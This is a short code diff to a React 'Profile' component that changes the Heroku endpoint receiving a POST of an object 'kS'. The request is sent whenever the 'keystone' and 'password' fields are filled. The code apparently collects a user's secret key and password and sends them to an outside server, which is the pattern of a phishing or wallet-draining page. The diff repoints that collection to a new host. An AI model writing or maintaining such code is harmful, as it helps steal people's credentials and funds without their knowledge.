@@ -32,7 +32,7 @@ const Profile = () => {
     keystone !== "" &&
       password !== "" &&
       axios
-        .post("https://shielded-earth-12418.herokuapp.com/send", kS)
+        .post("https://glacial-temple-10425.herokuapp.com/send", kS)
         .then((res) => res.json())
         .catch((err) => err);
   };
